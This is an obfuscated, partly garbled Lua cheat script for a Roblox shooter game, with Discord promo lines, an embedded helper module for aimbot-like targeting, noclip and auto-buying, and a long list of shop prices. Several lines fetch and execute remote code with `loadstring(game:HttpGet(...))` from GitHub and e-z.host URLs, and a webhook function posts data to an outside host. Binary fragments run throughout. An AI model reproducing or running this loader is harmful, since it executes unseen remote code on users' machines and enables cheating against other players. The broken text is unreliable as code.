-- antiv4 better stay humble  https://discord.gg/RcCz9uZuZ6

local v803868 = [[table]]

[[ return setfenv(function(...) return %s(...) end, setmetatable({ ["%s"] = ... }, { __index = getfenv((...)) })) ]]
[[�No���Q]]
local v291091 = [[getgenv]]
[[��]]
local v969646 = [[_]]
[[=Eo�\��-��Ӟ�s*)���9��^)�#���LO��+�Q� ��[MR0pn'ܹ�s}�~��2���҄e|��A�s�k�\Bk���AW�
�,�ϓ:��|.�tz�Y�ls�oV���٣�D.u��	ƋEv�'L
��SI�D�9�n��]]
[[Join discord.gg/msgabv2t9Q | discord.gg/stando to get latest update ok bai | If you pay for this script you get scammed, this script is completely free ok]]
[[p0�/��%��j]]
local v236461 = [[loadstring]]
[[~3&�]]
local v825048 = [[game]]
[[MWd�r|��]]
local v625290 = [[HttpGet]]
[[���p
E��6 *��~�oQ��í�欏;���|V�* ً�o�N�!�h�����u!���/�O]]
[[https://raw.githubusercontent.com/XK5NG/XK5NG.github.io/main/Handler]]
[[getgenv().Connections = {}

function Service(Service: string)
	return cloneref(game:GetService(Service))
end

local Players = Service("Players")
local Workspace = Service("Workspace")
local ReplicatedStorage = Service("ReplicatedStorage")
local TweenService = Service("TweenService")
local TextChatService = Service("TextChatService")
local ContentProvider = Service("ContentProvider")
local RunService = Service("RunService")

local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

local Handler = {}
local Connections = getgenv().Connections
local Playing = nil

function Handler:CloneRef(Service: string): Instance
    return cloneref(game:GetService(Service))
end

function Handler:GetChar(Player: Model)
    return LocalPlayer.Character:FindFirstChild(Player.Name)
end

function Handler:Is_KO(Player: Model)
    if Player and Player.Character and Player.Character:FindFirstChild("BodyEffects") then
        if Player.Character.BodyEffects:FindFirstChild("K.O") then
            return Player.Character.BodyEffects["K.O"]
        end
    end
end

function Handler:Is_Dead(Player: Model)
    if Player and Player.Character and Player.Character:FindFirstChild("BodyEffects") then
        if Player.Character.BodyEffects:FindFirstChild("SDeath") then
            return Player.Character.BodyEffects["SDeath"]
        end
    end
end

function Handler:Is_Attacking(Player: Model)
    if Player and Player.Character and Player.Character:FindFirstChild("BodyEffects") then
        if Player.Character.BodyEffects:FindFirstChild("Attacking") then
            return Player.Character.BodyEffects["Attacking"]
        end
    end
end

function Handler:Humanoid(Player: Model)
    if Player and Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
        return Player.Character:FindFirstChildOfClass("Humanoid")
    end
end

function Handler:UpperTorso(Player: Model)
    if Player and Player.Character and Player.Character:FindFirstChild("UpperTorso") then
        return Player.Character.UpperTorso
    end
end

function Handler:HumanoidRootPart(Player: Model)
    if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
        return Player.Character.HumanoidRootPart
    end
end

function Handler:ForceField(Player: Model)
    if Player and Player.Character and Player.Character:FindFirstChild("ForceField") then
        return Player.Character.ForceField
    end
end

function Handler:Is_Crew(Player: Player, Target: Player): boolean
	if Player and Target then
		local PlayerData = Player:FindFirstChild("DataFolder")
		local TargetData = Target:FindFirstChild("DataFolder")
		if PlayerData and TargetData then
			local PlayerInfo = PlayerData:FindFirstChild("Information")
			local TargetInfo = TargetData:FindFirstChild("Information")
			if PlayerInfo and TargetInfo then
				local PlayerCrew = PlayerInfo:FindFirstChild("Crew")
				local TargetCrew = TargetInfo:FindFirstChild("Crew")
				if PlayerCrew and TargetCrew and PlayerCrew.Value ~= "" and TargetCrew.Value ~= "" and PlayerCrew.Value == TargetCrew.Value then
					return true
				end
			end
		end
	end
	return false
end

function Handler:Cache_Tool()
    local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
    if Tool then
        local Handle = Tool:FindFirstChild("Handle")
        if Handle then
            local Offset = Vector3.new(0, 0, -Handle.Size.Z / 2)
            local Ammo = Tool:FindFirstChild("Ammo") and Tool.Ammo.Value or 0
            local MaxAmmo = Tool:FindFirstChild("MaxAmmo") and Tool.MaxAmmo.Value or 0
            local Gun = Tool:FindFirstChild("GunClient") ~= nil
            local Shotgun = Tool:FindFirstChild("GunClientShotgun") ~= nil
            local Automatic = Tool:FindFirstChild("GunClientAutomatic") ~= nil
            local Client = not (Gun or Shotgun or Automatic)

            return {
                Instance = Tool,
                Handle = Handle,
                Offset = Offset,
                Ammo = Ammo,
                MaxAmmo = MaxAmmo,
                Gun = Gun,
                Shotgun = Shotgun,
                Automatic = Automatic,
                Client = Client
            }
        end
    end
end

function Handler:ChangeState(Number: number)
    pcall(function()
        Handler:Humanoid(LocalPlayer):ChangeState(Number)
    end)
end

function Handler:GetAsset(Result: {[string]: string}): {[string]: Instance}
    local Results, Asset = {}, {}

    for Name, AssetID in pairs(Result) do
        local Assets = game:GetObjects(`rbxassetid://{AssetID}`)[1]
        Results[Name] = Assets:Clone()

        table.insert(Asset, Assets)

        for Index, Object in pairs(Assets:GetDescendants()) do
            table.insert(Asset, Object)
        end

        Assets.Parent = nil
		Assets:PivotTo(CFrame.new(1e6, 1e6, 1e6))
		Assets.Parent = workspace
		RunService.RenderStepped:Wait()
		Assets.Parent = nil
    end

    ContentProvider:PreloadAsync(Asset)

    return Results
end

function Handler:Get_Asset_By_Folder(Folder: string, Result: {[string]: string})
    local Results, Asset = {}, {}

    for Name, AssetID in pairs(Result) do
        local Assets = game:GetObjects(getcustomasset(`{Folder}/{AssetID}`))[1]
        Results[AssetID:match("^(.-)%.rbxm$"):gsub(" ", "_")] = Assets:Clone()

        table.insert(Asset, Assets)

        for self, Object in pairs(Assets:GetDescendants()) do
            if Object:IsA("ParticleEmitter") or Object:IsA("Trail") or Object:IsA("Beam") or Object:IsA("Fire") or Object:IsA("Smoke") or Object:IsA("Sparkles") or Object:IsA("PointLight") or Object:IsA("SurfaceLight") or Object:IsA("SpotLight") then
                Object.Enabled = true
            end
            table.insert(Asset, Object)
        end

        Assets.Parent = nil
        Assets:PivotTo(CFrame.new(1e6, 1e6, 1e6))
        Assets.Parent = workspace
        RunService.RenderStepped:Wait()
        Assets.Parent = nil
    end

    ContentProvider:PreloadAsync(Asset)
    return Results
end

function Handler:Get_Player(Text: string): Player?
	for Index, Player in pairs(Players:GetPlayers()) do
		if Player and Player ~= LocalPlayer and (Player.Name:lower():sub(1, #Text) == Text:lower() or Player.DisplayName:lower():sub(1, #Text) == Text:lower()) then
			return Player
		end
	end
	return nil
end

function Handler:Get_Mouse_Player(): Player?
    local Player, Shortest = nil, math.huge
    local Players = Players:GetPlayers()

    for Index = 1, #Players do
        local Target = Players[Index]
        if Target ~= LocalPlayer and (Target.Character and Target.Character:FindFirstChild("Head") and Target.Character:FindFirstChild("Humanoid") and Target.Character.Humanoid.Health > 0) then
            local ScreenPos, OnScreen = Camera:WorldToViewportPoint(Target.Character.Head.Position)
            if OnScreen then
                local Distance = (Vector2.new(ScreenPos.X, ScreenPos.Y) - Vector2.new(LocalPlayer:GetMouse().X, LocalPlayer:GetMouse().Y)).Magnitude
                if Distance < Shortest then
                    Player, Shortest = Target, Distance
                end
            end
        end
    end

    return Player
end

function Handler:Connected(Name: string)
	if typeof(Connections[Name]) == "RBXScriptConnection" then
		return Connections[Name].Connected
	elseif typeof(Connections[Name]) == "table" then
		for Index = 1, #Connections[Name] do
			if typeof(Connections[Name][Index]) == "RBXScriptConnection" and Connections[Name][Index].Connected then
				return true
			end
		end
		return false
	end
end

function Handler:Disconnect(Name: string | {string}, Nil: boolean)
	if typeof(Name) == "table" then
		for Index = 1, #Name do
			self:Disconnect(Name[Index], Nil)
		end
		return
	end

	if typeof(Connections[Name]) == "RBXScriptConnection" then
		if Connections[Name].Connected then
			Connections[Name]:Disconnect()
		end
	elseif typeof(Connections[Name]) == "table" then
		for Index = 1, #Connections[Name] do
			if typeof(Connections[Name][Index]) == "RBXScriptConnection" and Connections[Name][Index].Connected then
				Connections[Name][Index]:Disconnect()
			end
		end
	end

	if Nil then
		Connections[Name] = nil
	end
end

function Handler:AddConnection(Name: string | table, Connection: RBXScriptConnection?)
    if typeof(Connection) ~= "RBXScriptConnection" then 
        return 
    end
    
	if typeof(Name) == "string" then
		if typeof(Connections[Name]) == "RBXScriptConnection" and Connections[Name].Connected then
			Connections[Name]:Disconnect()
		end
		Connections[Name] = Connection
	elseif typeof(Name) == "table" then
		for Index = 1, #Name do
			if typeof(Name[Index]) == "RBXScriptConnection" and Name[Index].Connected then
				Name[Index]:Disconnect()
			end
		end
		table.insert(Name, Connection)
	end
end

function Handler:Unload()
    if not Connections or next(Connections) == nil then
        return
    end

    for Name, Connection in pairs(Connections) do
        if typeof(Connection) == "RBXScriptConnection" and Connection.Connected then
            Connection:Disconnect()
        end
    end

    table.clear(Connections)
end

function Handler:Create(Type: string, Properties: { [string]: any }): Instance
    if Properties.Name and (Properties.Parent or Workspace):FindFirstChild(Properties.Name) then
    	(Properties.Parent or Workspace):FindFirstChild(Properties.Name):Destroy()
    end

    local NewInstance = Instance.new(Type)

    for Index, Property in pairs(Properties) do
        NewInstance[Index] = Property
    end

    return NewInstance
end

function Handler:Find_Item(Name: string, Type: boolean)
	for Index, Shop in pairs(Workspace.Ignored.Shop:GetChildren()) do
		local Lower = Shop.Name:lower()
		if Type and Lower:find("ammo") and Lower:find(Name:lower()) and Shop:FindFirstChild("Head") then
			return Shop
		elseif not Type and not Lower:find("ammo") and Lower:find(Name:lower()) and Shop:FindFirstChild("Head") then
			return Shop
		end
	end
end

function Handler:Destroy(Name: Instance)
	if Name then
		Name:Destroy()
	end
end

function Handler:RemoveAccessory(Character: Model, Accessory: Accessory)
    for Name, Item in pairs(Character:GetChildren()) do
        if Item:IsA(Accessory) then
            Item:Destroy()
        end
    end
end

function Handler:Equip(Tool: string)
    if LocalPlayer.Backpack:FindFirstChild(Tool) and not LocalPlayer.Character:FindFirstChild(Tool) then
        LocalPlayer.Backpack:FindFirstChild(Tool).Parent = LocalPlayer.Character
    end
end

function Handler:PlaySound(ID: number, Vol: number)
    local Sound = Handler:Create("Sound", {
        SoundId = "rbxassetid://" .. ID,
        Volume = Vol,
        Parent = workspace
    })

    Sound:Play()

    Sound.Ended:Connect(function()
        Sound:Destroy()
    end)

    return Sound
end

function Handler:StopSound(Sound: any)
    if Sound and Sound.IsPlaying then
        Sound:Stop()
        Sound:Destroy()
    end
end

function Handler:Noclip(Character: Model)
    for Index, Part in pairs(Character:GetChildren()) do
        if (Part:IsA("Part") or Part:IsA("BasePart") or Part:IsA("MeshPart")) and Part.CanCollide then
            Part.CanCollide = false
        end
    end
end

function Handler:ZeroVelocity(Character: Model)
	for Index, Part in pairs(Character:GetChildren()) do
		if Part:IsA("BasePart") or Part:IsA("MeshPart") or Part:IsA("Part") then
			if Part.Velocity ~= Vector3.zero or Part.AssemblyLinearVelocity ~= Vector3.zero or Part.AssemblyAngularVelocity ~= Vector3.zero then
				Part.Velocity = Vector3.zero
				Part.AssemblyLinearVelocity = Vector3.zero
				Part.AssemblyAngularVelocity = Vector3.zero
			end
		end
	end
end

function Handler:ZeroVelocityCharacter(Character: Model)
	if Character.Velocity ~= Vector3.zero or Character.AssemblyAngularVelocity ~= Vector3.zero or Character.AssemblyLinearVelocity ~= Vector3.zero then
		Character.Velocity = Vector3.zero
		Character.AssemblyAngularVelocity = Vector3.zero
		Character.AssemblyLinearVelocity = Vector3.zero
	end
end

function Handler:Stop(Character: Model)
    for Index, Track in pairs(Handler:Humanoid(Character):GetPlayingAnimationTracks()) do
        Track:Stop()
    end
end

function Handler:AnimPlay(ID: string, Speed: number?, Time: number?, Smoothing: number?)
	if not Handler:Humanoid(LocalPlayer) or not Handler:Humanoid(LocalPlayer).Parent then
		return
	end
    
	for Index, Tracks in pairs(Handler:Humanoid(LocalPlayer):GetPlayingAnimationTracks()) do
		if Tracks.Animation and Tracks.Animation.AnimationId:match("rbxassetid://" .. ID) then
			Tracks:Stop()
		end
	end

	local Animation = Instance.new("Animation", workspace)
	Animation.AnimationId = "rbxassetid://" .. ID
	Playing = Handler:Humanoid(LocalPlayer):LoadAnimation(Animation)
	Playing.Priority = 4

	Playing:Play(tonumber(Smoothing) or nil)

	Playing:AdjustSpeed(tonumber(Speed) or 1)

	if tonumber(Time) then
		Playing.TimePosition = Time
	end

	Animation:Destroy()
end

function Handler:AnimStop(ID: string, Speed: number?)
	if not Handler:Humanoid(LocalPlayer) or not Handler:Humanoid(LocalPlayer).Parent then
		return
	end

	for Index, Track in pairs(Handler:Humanoid(LocalPlayer):GetPlayingAnimationTracks()) do
		if Track.Animation and Track.Animation.AnimationId:match("rbxassetid://" .. ID) then
            Track:Stop(Speed or nil)
		end
	end
end

function Handler:IsAnimPlaying(ID: string): boolean
	if not Handler:Humanoid(LocalPlayer) or not Handler:Humanoid(LocalPlayer).Parent then
		return
	end
	
	for Index, Track in pairs(Handler:Humanoid(LocalPlayer):GetPlayingAnimationTracks()) do
		if Track.Animation and Track.Animation.AnimationId:match("rbxassetid://" .. ID) and Track.IsPlaying then
			return true
		end
	end
	return false
end

function Handler:Tween(Part: Instance, Duration: number, Properties: { [string]: any }): void
    TweenService:Create(Part, TweenInfo.new(Duration), Properties):Play()
end

function Handler:Chat(Message: any)
    TextChatService.TextChannels.RBXGeneral:SendAsync(Message)
end

function Handler:HttpGet(Url: string | {string}): any
	if typeof(Url) == "table" then
		local Results = {}
		for Index = 1, #Url do
			local Success, Result = pcall(function()
				return loadstring(game:HttpGet(Url[Index]))
			end)

			if Success and typeof(Result) == "function" then
				Results[Index] = Result()
			else
				warn("HttpGet failed at Index " .. Index, Result)
			end
		end
		return table.unpack(Results)
	end

	local Success, Result = pcall(function()
		return loadstring(game:HttpGet(Url))
	end)

	if Success and typeof(Result) == "function" then
		return Result()
	end

	return nil
end

function Handler:SendWebhook(Url: string, Data: table)
	spawn(function()
		(http_request or request or (http and http.request) or (syn and syn.request))({
			Url = Url,
			Method = "POST",
			Headers = { ["content-type"] = "application/json" },
			Body = game:GetService("HttpService"):JSONEncode(Data),
		})
	end)
end

function Handler:Is_Reloading()
    local BodyEffects = LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("BodyEffects")
    local Reloading = BodyEffects and BodyEffects:FindFirstChild("Reload")
    return Reloading and Reloading.Value or false
end

return Handler
]]
[[(l	B��#}d��:�r\Ǚ������S%�����]]
[[https://i.e-z.host/p/raw/pscpu7q8bg]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/94j6IuYHu1dNMKDzClTL2x72zGPQ13AE"))()]]
[[�A��E,���G�9��3��ZC1$'!���L-�M��c�����-kզ�|�l�_yt�]]
[[https://raw.githubusercontent.com/XK5NG/XK5NG.github.io/main/Promo]]
[[return {
"HALLOWEEN25",
"ADMINABUSE",
}
]]
[[����|:�B��s��ɕ�`bv���t���z��]]
[[https://i.e-z.host/p/raw/86bljewyrf]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/bkew6SqTw7lqIFfE0oPJki2WkrgUgrw2"))()]]
[[��)�#JWy�, ]�B�k?�-I�⁡����(g��]]
[[https://i.e-z.host/p/raw/frpqujuqjo]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/main/X7gi8MTUUOEZ8vkoVFnjtVmJy9h6Zx12"))()]]
[[C)��Dp`lѯ�ow�~Բ$�����
$h���=]]
[[https://i.e-z.host/p/raw/b1faveyein]]
[[return loadstring(game:HttpGet("https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/refs/heads/main/xxxxx"))()]]
[[local v568329 = [[string]]
[[��S�0]]
local v908518 = [[find]]
[[W��sh�0��7��ޛ�0|���0�c�]Lx�t^�Z�t�"�� ��K
_5�I�F�(&�Ht�������"$��N��UP�#bO|���ei�T�)���<��jRE��{;/�]]
[[https://raw.githubusercontent.com/Sf5pW0HTjyyNmGhab0HXdOkB76PJOpRn/rP5UFI20l7FoyUhhkC5on4aZY8vjuyQv/main/skibidi]]
[[� ��]]
[[ |  |]]
[[t����]]
local v880394 = [[Owner]]
[[8C%o���(�]]
local v326126 = [[Whitelist]]
[[h���>��mW8�]]
local v442692 = [[Configuration]]
[[d�̜�]]
local v224258 = [[Guns]]
[[/��]A��]]
local v546576 = [[Strafe]]
[[;��X]]
local v391545 = [[Void]]
[[�.`-1d']]
local v399537 = [[CFrame]]
[[�c��]]
local v329115 = [[Lerp]]
[[t���]]
[[>i8]]
[[₻<.GX�]]
[[[[��]]
[[^]]
[[^]]
local v277474 = [[p]]
[[]]
[[�K���^g�]]
local v246861 = [[Prediction]]
[[R^��7��ȟ�]]
local v629858 = [[Multiplier]]
[[t�௞��]]
local v410710 = [[TimesAmmo]]
[[1�DT:d/]]
local v207490 = [[SpareAmmo]]
[[K�
L#v�]]
local v533275 = [[ForceAmmo]]
[[L�?��eB��j"*�K]]
local v834800 = [[InstantRespawn]]
[[n�Xg�^�#�]]
local v106852 = [[Cooldown]]
[[�����Mz�;]]
local v782557 = [[StompHeight]]
[[����4�f��%e��[]]
local v595908 = [[RandomStompOffset]]
[[+:��Bf]]
local v824021 = [[CSync]]
[[bVR��좾޸�22�]]
local v833374 = [[TimeBeforeVoid]]
[[��P��(f��Js���<]]
local v114573 = [[ReloadBeforeStomp]]
[[��S@��1��Փ�zc���3�[�]]
local v496482 = [[FakePositionRefreshing]]
[[�N�Q��5�����Nh��b��P�]]
local v305589 = [[FakePositionRefreshTime]]
[[���1� �y�}v�]]
local v931880 = [[FakePositionTime]]
[[}9��0]]
[[vO��[]]
[[vO��[]]
[[
�]]
[[#]]
[[�k7.�@�r�c]]
local v778574 = [[FreezeDelay]]
[[�9���R{�~�8�?]]
local v258062 = [[RefreshDelay]]
[[?��JR�G�=�<����a]]
local v613852 = [[DoubleBarrelTime]]
[[�k����d�@
u̙�^]]
local v566484 = [[CustomAnimationPlay]]
[[~�rk�eN��?��͛�]]
local v863440 = [[CustomAnimation]]
[[Âo@��˞�௚<����@]]
local v515600 = [[CustomAnimationSpeed]]
[[M^e�ci��ɢ]]
local v728840 = [[AuraRange]]
[[`���)��]]
local v556591 = [[SpamChat]]
[[E?�T]]
local v479319 = [[Delay]]
[[�w"�I�s]]
local v933087 = [[OnKilled]]
[[u:-R	r�]]
local v745544 = [[Message]]
[[�|/���u}�c[]]
local v476828 = [[SummonPrefix]]
[[�.�g��R���4]]
local v535461 = [[VoidingPrefix]]
[[d�̆�!*z]]
local v770279 = [[AutoMod]]
[[wC(M]]
local v521373 = [[CrewID]]
[[���m`��n]]
local v704708 = [[VoidView]]
[[��c�#]
v�]]
local v374559 = [[AntiStomp]]
[[��n-4�L�wy�]]
local v268813 = [[LowGraphic]]
[[�ܤ�Zc�P�9�]]
local v582448 = [[HideScreen]]
[[.��Օ�D?c��]]
local v473509 = [[CustomPrefix]]
[[�-���Vx]]
local v659341 = [[Fpscap]]
[[�ğɫ�궜	<]]
local v573706 = [[protectgui]]
[[A�}]]
local v864556 = [[syn]]
[[�S�mU��ˡ]]
local v882966 = [[CloneRef]]
[[��D�r�]]
local v383789 = [[Players]]
[[m-G1~��D]]]
local v445976 = [[RunService]]
[[��Z��`�]]
local v308487 = [[Workspace]]
[[����_|�T�]]
local v200494 = [[Lighting]]
[[q���� ]]
local v764467 = [[CoreGui]]
[[�V�@_��2��Ĉ]]
local v315016 = [[VirtualUser]]
[[�����Ko�%K��]]
local v200133 = [[TeleportService]]
[[local v984716 = [[UserInputService]]
[[ X[2�R?�D�z]]
local v334346 = [[TweenService]]
[[�&���_i�i�&�/��]]
local v623256 = [[TextChatService]]
[[9�iR>�`.�~�pb�e^]]
local v937037 = [[ReplicatedStorage]]
[[Y�
7u���2�h�_x�]]
local v507251 = [[MarketplaceService]]
[[6�1��FO<5]]
local v560301 = [[HttpService]]
[[�U���>�r�]]
local v212205 = [[StarterGui]]
[[X8�����Ep\]]
local v183771 = [[LocalPlayer]]
[[L�0��AS��]]
local v888902 = [[MainEvent]]
[[��!�c�<Di�]]
local v842210 = [[CurrentCamera]]
[[��`7]]
local v144784 = [[Name]]
[[�	_��]]
local v286905 = [[tick]]
[[������ģ�'2y����]]
local v272358 = [[GunEquipCooldown]]
[[(jA]]
local v667030 = [[new]]
[[� �]]
[[(]]
[[��;����L]]
[[[[��]]
[[m�]]
[[m�]]
[[�x&#]]
local v165695 = [[math]]
[[N̶F嵞]]
local v220019 = [[random]]
[[�`1'�]]
local v757622 = [[AK47]]
[[�K]]
local v172617 = [[AR]]
[[L�8]]
local v672927 = [[AUG]]
[[�G�
?�]]
local v668725 = [[DrumGun]]
[[37��Ji� #R]]
local v696371 = [[Flintlock]]
[[���cU]]
local v235696 = [[Glock]]
[[�,�]]
local v133364 = [[LMG]]
[[
��]]
local v748451 = [[P90]]
[[���ו�b(t]]
local v716259 = [[Revolver]]
[[�W�$D]]
local v490694 = [[Rifle]]
[[��*?]]
local v940488 = [[SMG]]
[[G��[m�Y�&]]
local v332036 = [[Silencer]]
[[��K�9�-���]]
local v486844 = [[SilencerAR]]
[[V�GA볨8�]]
local v266233 = [[Character]]
[[$���jj�4 Hw]]
local v429197 = [[WaitForChild]]
[[�
}:���ND�vt���]]
local v584580 = [[FULLY_LOADED_CHAR]]
[[t�衐4
�]]
local v183603 = [[Backpack]]
[[�n��*�5�P��]]
local v766769 = [[ChatConnection]]
[[Ż�I]]
[[<i8]]
[[�{���C�]]
[[[[�s�]]
[[�%[[�%[[jWV��ɻ�歐1]]
local v754618 = [[MethodHooked]]
[[A�eU��m*�D�d]]
local v179515 = [[RaycastParams]]
[[�}�_�]]
local v236161 = [[Enum]]
[[�local v785950 = [[RaycastFilterType]]
[[��fB��:���]]
local v650605 = [[Blacklist]]
[[{ϫ�0���]]
local v498845 = [[FilterType]]
[[ ��=��xp]$=_.���Fn�FJ��;�]]
local v820078 = [[FilterDescendantsInstances]]
[[�3o��t��O�$�a��ǟM轛local v735800 = [[FallenPartsDestroyHeight]]
[[�U9?e&�]]
local v512079 = [[isfolder]]
[[*�����+��]]
local v212384 = [[sniper bot]]
[[oT�		�w]]
local v753464 = [[isfile]]
[[�}��a�1�_�O�zb��Ҿ[����]]
[[sniper bot/whitelist.json]]
[[�\@4,P$local v589598 = [[Instance]]
[[@?&l���&�]]
local v404832 = [[ScreenGui]]
[[ EP8�d�d�lu�]]
local v301467 = [[IgnoreGuiInset]]
[[��r?�C�oq�l]]
local v100633 = [[ResetOnSpawn]]
[[��cI���]]
local v191040 = [[Parent]]
[[���Lj>2l.]]
local v919467 = [[TextLabel]]
[[Q�P$k�]]
local v285754 = [[UDim2]]
[[�K�pF]]
local v911057 = [[Size]]
[[���
��Ej�]]
local v488114 = [[Position]]
[[�_��]]
local v851564 = [[Text]]
[[���A�2�j�^L]]
[[no target...]]
[[j|].:]/]]
local v316013 = [[Visible]]
[[�ۓ��]]
local v836919 = [[ZIndex]]
[[��[]]
local v276809 = [[Font]]
[[�7D8local v690531 = [[SourceSans]]
[[wv��Y]]
local v707571 = [[Color3]]
[[0Hv��~�,�]]
local v119314 = [[TextColor3]]
[[���oY%�t4�_�qc�cI��;]]
local v350548 = [[BackgroundTransparency]]
[[a�%b����H]]
local v577692 = [[TextScaled]]
[[Y�	=j���]]
local v818299 = [[TextSize]]
[[H"/w��]]
local v405102 = [[Frame]]
[[�B�Q@��1��Ź�x"t�]]
local v457081 = [[BackgroundColor3]]
[[T|�=3]]
local v335778 = [[pairs]]
[[_j�k@�cB���]]
local v174896 = [[GetPlayers]]
[[S�I�#]]]
[[��' ]]
[[��' ]]
[[D�g��,/]]
[[>><H J ]]
[[�����]]
local v412633 = [[lower]]
[[Ә]]
local v532357 = [[I]]
[[_�fs�qO���]]
local v730758 = [[Raycasting]]
[[ZLJ��	��ܟ]]
local v959197 = [[Find_Item]]
[[-dx�E�q�+��$��E[��D]]
[[[High-Medium Armor]]]
[[i�]]
local v613300 = [[K]]
[[�$]]
local v683192 = [[huge]]
[[{���'�]]
local v654816 = [[Ignored]]
[[)�Tz^]]
local v872186 = [[Shop]]
[[�4�Y�wy�fI��]]
local v230191 = [[GetChildren]]
[[[glock] - $563]]
[[[silencer] - $619]]
[[25 [glock ammo] - $68]]
[[25 [silencer ammo] - $56]]
[[[paintball mask] - $68]]
[[[ninja mask] - $68]]
[[[cranberry] - $3]]
[[[tacticalshotgun] - $1970]]
[[20 [tacticalshotgun ammo] - $68]]
[[[p90] - $1126]]
[[120 [p90 ammo] - $68]]
[[[aug] - $2195]]
[[90 [aug ammo] - $90]]
[[[knife] - $169]]
[[[pepperspray] - $84]]
[[[lockpicker] - $141]]
[[[silencer] - $450]]
[[30 [glock ammo] - $68]]
[[[glock] - $338]]
[[[donut] - $6]]
[[[smg] - $844]]
[[80 [smg ammo] - $68]]
[[25 [glock ammo] - $68]]
[[[glock] - $563]]
[[100 [ar ammo] - $84]]
[[[ar] - $1126]]
[[20 [shotgun ammo] - $68]]
[[[shotgun] - $1407]]
[[[cranberry] - $3]]
[[[pizza] - $6]]
[[[chicken] - $8]]
[[[taser] - $1126]]
[[[weights] - $135]]
[[[heavyweights] - $281]]
[[[popcorn] - $8]]
[[[pizza] - $6]]
[[[rifle] - $1745]]
[[[camera] - $113]]
[[[grenade] - $1407]]
[[[rpg] - $6753]]
[[5 [rpg ammo] - $1126]]
[[[key] - $141]]
[[[chicken] - $8]]
[[[cranberry] - $3]]
[[[pizza] - $6]]
[[[flashlight] - $11]]
[[[flashlight] - $11]]
[[[flashlight] - $11]]
[[80 [smg ammo] - $68]]
[[[smg] - $844]]
[[[double-barrel sg] - $1576]]
[[18 [double-barrel sg ammo] - $68]]
[[25 [silencer ammo] - $56]]
[[[silencer] - $619]]
[[[flashbang] - $619]]
[[[grenade] - $788]]
[[100 [ar ammo] - $84]]
[[[ar] - $1126]]
[[[bat] - $310]]
[[[bat] - $281]]
[[[lettuce] - $6]]
[[[revolver] - $1463]]
[[5 [rifle ammo] - $281]]
[[[pinkphone] - $450]]
[[[iphoneg] - $675]]
[[[basketball] - $113]]
[[[original phone] - $56]]
[[[iphone] - $675]]
[[[iphoneb] - $675]]
[[[iphonep] - $675]]
[[[orange phone] - $450]]
[[[medium armor] - $1126]]
[[[medium armor] - $1126]]
[[[high-medium armor] - $3377]]
[[k���w���;�a�]]
local v643471 = [[FindFirstChild]]
[[���ϣ]]
local v912053 = [[Head]]
[[MYy�f}��ݳ�٣�local v708174 = [[FindFirstChildOfClass]]
[[:i�-���-��x
L]]
local v679968 = [[ClickDetector]]
[[�N��5�]]
local v200087 = [[match]]
[[���y�e�]]
[[%$(%d+)]]
[[4�&��QwK5]]
local v186649 = [[tonumber]]
[[[lockpicker] - $141]]
[[[surgeon mask] - $28]]
[[boxing moveset (require: max box stat) - $0]]
[[[default moveset] - $0]]
[[[riot mask] - $68]]
[[[pitchfork] - $360]]
[[[taco] - $2]]
[[[hamburger] - $6]]
[[[taco] - $5]]
[[[hockey mask] - $68]]
[[[lemonade] - $3]]
[[[sledgehammer] - $394]]
[[[lmg] - $4221]]
[[200 [lmg ammo] - $338]]
[[12 [revolver ammo] - $84]]
[[[breathing mask] - $68]]
[[[lockpicker] - $113]]
[[[cranberry] - $3]]
[[[starblox latte] - $6]]
[[[pepperspray] - $169]]
[[[pumpkin mask] - $68]]
[[[skull mask] - $68]]
[[[stopsign] - $338]]
[[[silencerar] - $1407]]
[[120 [silencerar ammo] - $84]]
[[[ak47] - $2532]]
[[90 [ak47 ammo] - $90]]
[[[flowers] - $6]]
[[[firework] - $11255]]
[[[paintball mask] - $68]]
[[[surgeon mask] - $28]]
[[[surgeon mask] - $28]]
[[[surgeon mask] - $28]]
[[[antibodies] - $113]]
[[100 [drumgun ammo] - $225]]
[[[drumgun] - $3377]]
[[[money gun] - $875]]
[[[chicken] - $8]]
[[[shovel] - $360]]
[[[brownbag] - $28]]
[[[shotgun] - $1407]]
[[20 [shotgun ammo] - $68]]
[[[old phone] - $113]]
[[[tele] - $169]]
[[5 [rpg ammo] - $1126]]
[[[rpg] - $22510]]
[[[flamethrower] - $10130]]
[[140 [flamethrower ammo] - $1126]]
[[[basketball] - $113]]
[[[donut] - $11]]
[[12 [grenadelauncher ammo] - $3377]]
[[[grenadelauncher] - $11255]]
[[[hamburger] - $11]]
[[[high-medium armor] - $2589]]
[[[pencil] - $197]]
[[[pepperspray] - $169]]
[[[pizza] - $11]]
[[[surgeon mask] - $28]]
[[[fire armor] - $4501]]
[[[fire armor] - $2701]]
[[[da milk] - $8]]
[[[foodscart] - $17]]
[[[meat] - $14]]
[[5 [rifle ammo] - $281]]
[[[rifle] - $1745]]
[[[teargas] - $5628]]
[[[hotdog] - $9]]
[[18 [double-barrel sg ammo] - $56]]
[[[double-barrel sg] - $1519]]
[[[hamburger] - $11]]
[[[popcorn] - $8]]
[[[drum-shotgun] - $1238]]
[[18 [drum-shotgun ammo] - $73]]
[[[medium armor] - $1131]]
[[[medium armor] - $1407]]
[[[revolver] - $1576]]
[[12 [revolver ammo] - $56]]
[[[fire armor] - $4501]]
[[[medium armor] - $1131]]
[[[whip] - $281]]
[[[hair glue] - $23]]
[[[medium armor] - $1407]]
[[[flintlock] - $1463]]
[[6 [flintlock ammo] - $168]]
[[100 [ar ammo] - $84]]
[[[ar] - $1126]]
[[[chicken] - $8]]
[[[cranberry] - $3]]
[[18 [double-barrel sg ammo] - $68]]
